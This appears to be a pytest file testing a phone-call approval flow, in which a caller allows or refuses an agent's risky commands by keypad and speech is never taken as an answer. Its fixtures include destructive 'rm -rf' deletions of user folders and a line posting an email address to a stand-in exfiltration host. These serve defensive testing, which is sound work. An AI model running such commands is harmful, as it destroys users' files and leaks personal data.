"""Commands that need the caller's OK: the call says what Hermes wants to do, and only the keypad answers.

Approvals go through Hermes's real approval queue: a thread waits for the decision like the agent does, while
the adapter gets the prompt the way the gateway hands it over (``send_exec_approval``). Only the auxiliary
model that describes the command is faked."""
import asyncio
import dataclasses
import re
import sys
import threading
from types import SimpleNamespace

import pytest

from conftest import SHORT_PHRASES, FakeSTT, deliver, logged_in_phone, until
from test_outbound_calls import MESSAGE, heard_about, recording_handler

COMMAND = "rm -rf ~/Documents/old"
DESCRIPTION = "Smaže starou složku v Dokumentech."


class Approval:
    """A command Hermes asks the caller's OK for. ``decision`` is what the waiting agent gets:
    ``{"resolved", "choice", ...}`` from ``tools.approval_gateway_wait``."""

    def __init__(self, adapter, chat_id: str, command: str = COMMAND, **flags):
        from tools.approval_gateway_wait import _await_gateway_decision

        loop = asyncio.get_running_loop()
        call = adapter._calls.get(chat_id)
        session_key = call.session_key if call else f"agent:main:phone:dm:{chat_id}"
        self.decision = loop.create_future()

        def notify(data):  # the gateway's notifier: runs in the agent thread, renders on the loop
            sent = asyncio.run_coroutine_threadsafe(adapter.send_exec_approval(
                chat_id, data["command"], session_key, description=data["description"],
                request_id=data["request_id"], **flags), loop)
            assert sent.result(timeout=15).success

        def wait():
            decision = _await_gateway_decision(session_key, notify, {
                "command": command, "description": "recursive delete", "pattern_key": "recursive delete",
                "pattern_keys": ["recursive delete"]})
            loop.call_soon_threadsafe(self.decision.set_result, decision)

        threading.Thread(target=wait, daemon=True).start()

    async def choice(self, timeout: float = 20):
        """"once" or "deny" as the caller answered, "withdrawn" if the call took the request back (Hermes refuses it
        then too), None if Hermes gave up waiting."""
        decision = await asyncio.wait_for(asyncio.shield(self.decision), timeout)
        return "withdrawn" if decision.get("cancelled") else decision["choice"]


@pytest.fixture(autouse=True)
def hermes_waits_a_minute(monkeypatch):
    """Hermes's own approvals.timeout (300 s): shorter, so a test that fails leaves no thread waiting long."""
    monkeypatch.setattr("tools.approval_context._get_approval_timeout", lambda: 60)


@pytest.fixture(autouse=True)
def model(monkeypatch):
    """Hermes's auxiliary model: describes every command as it ``says`` (or raises ``fails``) and records the
    requests it got."""
    model = SimpleNamespace(requests=[], fails=None, says=DESCRIPTION)

    def call_llm(task=None, *, messages, **kwargs):
        model.requests.append({"task": task, "messages": messages})
        if model.fails:
            raise model.fails
        return SimpleNamespace(choices=[SimpleNamespace(message=SimpleNamespace(content=model.says))])

    monkeypatch.setattr("agent.auxiliary_client.call_llm", call_llm)
    return model


def said(monkeypatch) -> list[str]:
    """What the call says from now on: each text the voice speaks."""
    from agent.tts_registry import get_provider
    voice = get_provider("piper_stream")
    texts, stream = [], voice.stream

    def recording(text, **kwargs):
        texts.append(text)
        return stream(text, **kwargs)

    monkeypatch.setattr(voice, "stream", recording)
    return texts


async def calling(make_adapter, **settings):
    adapter = make_adapter(**settings)
    assert await adapter.connect()
    return adapter, await logged_in_phone(adapter)


async def asked(adapter, phone, **flags) -> Approval:
    """An approval whose prompt the caller has heard to the end."""
    phone.frames.clear()
    approval = Approval(adapter, str(phone.call_id), **flags)
    await phone.wait_for_silence()
    phone.frames.clear()
    return approval


async def test_key_1_allows_the_command_once(phone_adapter):
    phone = await logged_in_phone(phone_adapter)
    approval = await asked(phone_adapter, phone)

    await phone.press("1")

    assert await approval.choice() == "once"
    await phone.wait_for_silence()
    assert heard_about(phone.speech_frames(), SHORT_PHRASES["approved"])
    await phone.hang_up()


async def test_key_2_refuses_it(phone_adapter):
    phone = await logged_in_phone(phone_adapter)
    approval = await asked(phone_adapter, phone)

    await phone.press("2")

    assert await approval.choice() == "deny"
    await phone.wait_for_silence()
    assert heard_about(phone.speech_frames(), SHORT_PHRASES["refused"])
    await phone.hang_up()


async def test_keys_pressed_before_the_prompt_was_heard_do_not_count(make_adapter):
    adapter, phone = await calling(make_adapter, approval_timeout=2)
    await phone.press("1")  # earlier in the call
    approval = Approval(adapter, str(phone.call_id))
    await phone.wait_for_speech(timeout=10, run=10)

    await phone.press("1")  # while the prompt is said

    assert await approval.choice() == "deny"
    await phone.hang_up()
    await adapter.disconnect()


async def test_no_key_in_time_refuses_it(make_adapter):
    adapter, phone = await calling(make_adapter, approval_timeout=2)
    approval = await asked(adapter, phone)

    assert await approval.choice() == "deny"
    await phone.wait_for_silence()
    assert heard_about(phone.speech_frames(), SHORT_PHRASES["refused"])
    await phone.hang_up()
    await adapter.disconnect()


async def test_hanging_up_refuses_it(phone_adapter):
    phone = await logged_in_phone(phone_adapter)
    approval = await asked(phone_adapter, phone)

    await phone.hang_up()

    assert await approval.choice(timeout=5) == "withdrawn"


async def test_an_approval_after_the_call_ended_is_refused(phone_adapter):
    phone = await logged_in_phone(phone_adapter)
    chat_id = str(phone.call_id)
    await phone.hang_up()

    assert await Approval(phone_adapter, chat_id).choice(timeout=5) == "withdrawn"


async def test_with_approvals_off_commands_are_refused_and_the_caller_is_told(make_adapter):
    adapter, phone = await calling(make_adapter, approvals="deny")

    approval = Approval(adapter, str(phone.call_id))

    assert await approval.choice(timeout=5) == "withdrawn"
    await phone.wait_for_silence()
    assert heard_about(phone.speech_frames(), SHORT_PHRASES["denied"])
    await phone.hang_up()
    await adapter.disconnect()


async def test_approvals_are_asked_one_after_the_other_and_each_key_answers_its_own(phone_adapter):
    phone = await logged_in_phone(phone_adapter)
    first = await asked(phone_adapter, phone)
    second = Approval(phone_adapter, str(phone.call_id), command="rm -rf ~/Downloads/old")
    await asyncio.sleep(0.5)
    assert not second.decision.done()

    await phone.press("2")
    assert await first.choice() == "deny"
    await phone.wait_for_silence()  # refused, then the second prompt
    await phone.press("1")

    assert await second.choice() == "once"
    await phone.hang_up()


async def test_speech_never_answers_an_approval_and_the_keys_are_said_again(make_adapter, monkeypatch):
    FakeSTT(monkeypatch, "Ano, schvaluji to.")
    adapter, phone = await calling(make_adapter, approval_timeout=8)
    events = recording_handler(adapter)
    approval = await asked(adapter, phone)

    await phone.say("Ano, schvaluji to.")
    await phone.wait_for_silence()

    assert heard_about(phone.speech_frames(), SHORT_PHRASES["approval_keys"])
    assert not events  # nothing reached Hermes
    assert await approval.choice() == "deny"  # no key: refused
    await phone.hang_up()
    await adapter.disconnect()


async def test_what_the_caller_says_cannot_answer_an_approval_in_hermes(phone_adapter, monkeypatch):
    """Hermes takes a bare "yes" while an approval waits as its answer; a transcript must never be one."""
    from gateway.run_busy import GatewayBusySessionMixin

    FakeSTT(monkeypatch, "yes")
    events = recording_handler(phone_adapter)
    phone = await logged_in_phone(phone_adapter)
    await phone.say("Yes.")
    await until(lambda: events)
    approval = await asked(phone_adapter, phone)
    answers = []

    class Gateway(GatewayBusySessionMixin):
        async def _handle_approve_command(self, event):
            answers.append(event.text)

        _handle_deny_command = _handle_approve_command

        def _delivery_adapter_for(self, source):
            return None

    def route(event):
        session_key = phone_adapter._calls[str(phone.call_id)].session_key
        return Gateway._route_plaintext_approval_while_busy(Gateway.__new__(Gateway), event, session_key)

    assert not await route(events[0]) and not answers
    assert await route(dataclasses.replace(events[0], allow_gateway_control=True))  # what it would do
    await phone.press("2")
    assert await approval.choice() == "deny"
    await phone.hang_up()


async def test_star_refuses_every_waiting_approval(phone_adapter):
    phone = await logged_in_phone(phone_adapter)
    first = await asked(phone_adapter, phone)
    second = Approval(phone_adapter, str(phone.call_id), command="rm -rf ~/Downloads/old")
    await asyncio.sleep(0.5)

    await phone.press("*")

    assert [await first.choice(timeout=5), await second.choice(timeout=5)] == ["withdrawn", "withdrawn"]
    await phone.wait_for_silence()
    assert heard_about(phone.speech_frames(), SHORT_PHRASES["stopped"])
    await phone.hang_up()


async def test_the_keys_are_said_again_on_any_other_key_and_while_it_waits(phone_adapter, monkeypatch):
    monkeypatch.setattr(sys.modules[type(phone_adapter).__module__], "KEYS_AGAIN_S", 3)
    phone = await logged_in_phone(phone_adapter)
    approval = await asked(phone_adapter, phone)

    await phone.wait_for_silence()  # said again after 3 s without a key
    assert heard_about(phone.speech_frames(), SHORT_PHRASES["approval_keys"])
    phone.frames.clear()
    await phone.press("5")
    await phone.wait_for_silence(seconds=0.5)
    assert heard_about(phone.speech_frames(), SHORT_PHRASES["approval_keys"])

    await phone.press("1")
    assert await approval.choice() == "once"
    await phone.hang_up()


async def test_an_approval_hermes_gave_up_on_is_left_for_the_next_one(phone_adapter, monkeypatch):
    hermes_waits = [3]
    monkeypatch.setattr("tools.approval_context._get_approval_timeout", lambda: hermes_waits[0])
    phone = await logged_in_phone(phone_adapter)
    expired = await asked(phone_adapter, phone)

    assert await expired.choice(timeout=10) is None  # Hermes's timeout: not answered
    hermes_waits[0] = 60
    approval = await asked(phone_adapter, phone)
    await phone.press("1")

    assert await approval.choice() == "once"
    await phone.hang_up()


async def test_an_approval_the_caller_cannot_hear_is_refused(phone_adapter, monkeypatch):
    phone = await logged_in_phone(phone_adapter)

    async def no_voice(text, clean=True):
        return b""

    monkeypatch.setattr(phone_adapter, "_synthesize", no_voice)

    assert await Approval(phone_adapter, str(phone.call_id)).choice(timeout=5) == "withdrawn"
    await phone.hang_up()


async def test_a_message_waits_until_the_approval_is_answered(phone_adapter):
    phone = await logged_in_phone(phone_adapter)
    approval = await asked(phone_adapter, phone)

    await deliver(phone_adapter, MESSAGE)
    await asyncio.sleep(2)
    assert not phone.speech_frames()
    await phone.press("1")

    assert await approval.choice() == "once"
    await phone.wait_for_silence()
    assert heard_about(phone.speech_frames(), f"{SHORT_PHRASES['approved']} {MESSAGE}")
    await phone.hang_up()


@pytest.mark.parametrize("language, says_first", [("cs", None), ("", "Pošli to na Slack.")])
async def test_the_caller_hears_what_the_command_does_in_their_language(make_adapter, monkeypatch, model, language,
                                                                        says_first):
    """The language set on the plugin page, else that of what the caller said last."""
    adapter, phone = await calling(make_adapter, language=language)
    if says_first:
        FakeSTT(monkeypatch, says_first)
        events = recording_handler(adapter)
        await phone.say(says_first)
        await until(lambda: events)
    texts = said(monkeypatch)

    approval = await asked(adapter, phone)

    assert SHORT_PHRASES["approval"] in texts and DESCRIPTION in texts
    request, = model.requests
    instructions = request["messages"][0]["content"]
    assert request["task"] == "approval"
    assert re.search(rf"(?<!\w){re.escape(language or says_first)}(?!\w)", instructions)
    assert COMMAND in request["messages"][-1]["content"] and COMMAND not in instructions  # data, not instructions
    await phone.press("1")
    assert await approval.choice() == "once"
    await phone.hang_up()
    await adapter.disconnect()


async def test_every_web_address_in_the_code_is_said_as_written(phone_adapter, monkeypatch):
    """Whatever the description says, and also those Hermes's text cleaner would drop as code."""
    phone = await logged_in_phone(phone_adapter)
    texts = said(monkeypatch)
    command = ("execute_code <<'PY'\n"
               + "".join(f"get('https://{host}:8080/x')\n" for host in ["hooks.slack.com", "api-v2.example.com",
                                                                        "example.sh", "[2001:db8::1]", "198.51.100.7",
                                                                        "xn--80ak6aa92e.com"])
               + "post('https://exfil.example',json={'u':'alice@trusted.example'})\nPY")

    approval = await asked(phone_adapter, phone, command=command)

    assert (f"{SHORT_PHRASES['approval_addresses']} hooks.slack.com, api-v2.example.com, example.sh, 2001:db8::1, "
            "198.51.100.7, xn--80ak6aa92e.com, exfil.example.") in texts
    await phone.press("2")
    assert await approval.choice() == "deny"
    await phone.hang_up()


@pytest.mark.parametrize("fails, says", [(TimeoutError("no answer"), None), (None, "<think> Smaže složku.")])
async def test_a_command_hermes_cannot_describe_is_refused_and_the_caller_is_told(phone_adapter, model, fails, says):
    model.fails, model.says = fails, says  # an open <think> leaves nothing to say
    phone = await logged_in_phone(phone_adapter)

    approval = Approval(phone_adapter, str(phone.call_id))

    assert await approval.choice(timeout=5) == "withdrawn"
    await phone.wait_for_silence()
    assert heard_about(phone.speech_frames(), SHORT_PHRASES["denied"])
    await phone.hang_up()


async def test_a_command_the_safety_check_refused_is_said_to_be_dangerous_and_can_be_allowed_once(phone_adapter,
                                                                                                  monkeypatch):
    phone = await logged_in_phone(phone_adapter)
    texts = said(monkeypatch)

    approval = await asked(phone_adapter, phone, smart_denied=True)

    assert SHORT_PHRASES["approval_dangerous"] in texts
    await phone.press("1")
    assert await approval.choice() == "once"
    await phone.hang_up()


async def test_a_description_the_text_cleaner_cuts_short_cannot_take_the_keys_with_it(phone_adapter, monkeypatch,
                                                                                      model):
    model.says = f"{DESCRIPTION} <think>"
    phone = await logged_in_phone(phone_adapter)
    texts = said(monkeypatch)

    approval = await asked(phone_adapter, phone)

    assert SHORT_PHRASES["approval_keys"] in texts
    await phone.press("1")
    assert await approval.choice() == "once"
    await phone.hang_up()


async def test_speech_over_an_approval_never_reaches_hermes_even_if_a_key_answers_it_meanwhile(phone_adapter,
                                                                                                monkeypatch):
    FakeSTT(monkeypatch, "Ano, schvaluji to.", delay=2)
    events = recording_handler(phone_adapter)
    phone = await logged_in_phone(phone_adapter)
    approval = await asked(phone_adapter, phone)

    await phone.say("Ano, schvaluji to.")
    await phone.press("1")

    assert await approval.choice() == "once"
    await asyncio.sleep(3)  # longer than the recognition would take
    assert not events
    await phone.hang_up()


async def test_speech_recognised_while_an_approval_came_cannot_skip_its_prompt(make_adapter, monkeypatch):
    """Talking over a message, then an approval (e.g. of work in the background) comes while that is recognised:
    the speech is dropped, and the prompt is still said in full before a key counts."""
    question = "Počkej, ještě než to uděláš, mám k tomu jednu důležitou otázku."
    FakeSTT(monkeypatch, question, delay=3)
    adapter, phone = await calling(make_adapter, approval_timeout=3)
    events = recording_handler(adapter)
    await deliver(adapter, MESSAGE)
    await phone.wait_for_speech(timeout=10, run=20)
    await phone.say(question)
    await asyncio.sleep(1)  # the speech has ended and is being recognised
    approval = Approval(adapter, str(phone.call_id))

    await asyncio.sleep(3)  # recognised
    await phone.press("1")

    assert await approval.choice() == "deny"  # the key came while the prompt was said, and none after it
    assert not events
    await phone.hang_up()
    await adapter.disconnect()


async def test_an_answer_hermes_does_not_take_from_the_caller_withdraws_the_approval(phone_adapter, monkeypatch):
    """E.g. approvals.approvers narrowed to someone else."""
    monkeypatch.setattr("tools.approval_context.prompt_authority",
                        lambda: {"requester_id": "someone-else", "approvers": []})
    phone = await logged_in_phone(phone_adapter)
    approval = await asked(phone_adapter, phone)

    await phone.press("1")

    assert await approval.choice(timeout=5) == "withdrawn"
    await phone.wait_for_silence()
    assert heard_about(phone.speech_frames(), SHORT_PHRASES["refused"])
    await phone.hang_up()


async def test_if_the_voice_fails_after_an_answer_the_waiting_approvals_are_withdrawn(phone_adapter, monkeypatch):
    phone = await logged_in_phone(phone_adapter)
    first = await asked(phone_adapter, phone)
    second = Approval(phone_adapter, str(phone.call_id), command="rm -rf ~/Downloads/old")
    await asyncio.sleep(0.5)
    synthesize = phone_adapter._synthesize

    async def failing(text, clean=True):
        if text == SHORT_PHRASES["refused"]:
            raise RuntimeError("the voice crashed")
        return await synthesize(text, clean)

    monkeypatch.setattr(phone_adapter, "_synthesize", failing)
    await phone.press("2")

    assert [await first.choice(), await second.choice(timeout=5)] == ["deny", "withdrawn"]
    await phone.hang_up()
